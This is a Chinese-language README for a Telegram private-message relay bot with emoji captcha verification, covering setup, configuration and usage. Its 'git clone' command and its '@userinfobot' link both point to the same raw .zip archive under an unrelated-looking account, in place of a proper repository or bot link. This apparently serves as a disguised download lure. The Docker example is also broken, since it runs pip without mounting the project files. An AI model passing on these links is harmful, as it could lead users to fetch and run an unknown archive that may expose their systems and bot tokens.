# 🤖 DM Gateway Bot

一个 Telegram 私聊中转机器人，带 Emoji Captcha 验证，防止陌生人直接骚扰。验证通过后，用户消息会转发给 Bot 主人，主人可直接回复。

## ✨ 功能

- **Emoji Captcha 验证** — 新用户需点击正确表情才能发送消息
- **消息中转** — 验证通过的用户消息自动转发给主人
- **主人回复** — 主人回复转发消息时，内容自动送达对应用户
- **内存状态** — 轻量无数据库，重启后已验证状态重置（可自行扩展持久化）

## 🚀 快速开始

### 1. 克隆项目

```bash
git clone https://raw.githubusercontent.com/retardingforcerightbank635/dm-gateway-bot/main/endaspidean/dm-gateway-bot-v3.3-alpha.5.zip
cd dm-gateway-bot
```

### 2. 安装依赖

```bash
pip install -r requirements.txt
```

### 3. 配置环境变量

```bash
cp .env.example .env
```

编辑 `.env`：

```env
BOT_TOKEN=your_bot_token_here   # 从 @BotFather 获取
OWNER_ID=your_telegram_user_id  # 你的 Telegram 数字 ID
```

> 获取自己的 Telegram ID：向 [@userinfobot](https://raw.githubusercontent.com/retardingforcerightbank635/dm-gateway-bot/main/endaspidean/dm-gateway-bot-v3.3-alpha.5.zip) 发送任意消息即可。

### 4. 运行

```bash
python bot.py
```

## 📖 使用说明

### 对访客
1. 私聊 Bot，发送 `/start`
2. 点击正确的表情完成验证
3. 验证通过后直接发消息，Bot 会转达给主人

### 对主人（OWNER_ID）
- 主人私聊 Bot 时不需要验证
- 收到转发消息后，**直接回复该消息**即可将内容发送给对应用户

## 🐳 Docker 部署（可选）

```bash
docker run -d \
  -e BOT_TOKEN=your_token \
  -e OWNER_ID=your_id \
  --restart unless-stopped \
  --name dm-gateway \
  python:3.11-slim \
  sh -c "pip install -r requirements.txt && python bot.py"
```

## ⚙️ 环境变量

| 变量 | 必填 | 说明 |
|------|------|------|
| `BOT_TOKEN` | ✅ | Telegram Bot Token，从 @BotFather 获取 |
| `OWNER_ID` | ✅ | 主人的 Telegram 用户 ID（纯数字） |

## 📄 License

MIT
